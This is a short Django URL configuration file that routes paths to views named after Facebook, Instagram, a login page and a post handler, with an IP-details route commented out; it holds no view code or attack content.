from django.urls import path
from . import views, ipinfo


urlpatterns = [
    path('', views.facebook, name="facebook"),
    path('logIns', views.instagram, name="inst"),
    path('login', views.newLogin, name="login"),
    path('post', views.post, name="post"),
    # path('get_ip_details', ipinfo.get_ip_details, name="get_ip_details"),
]
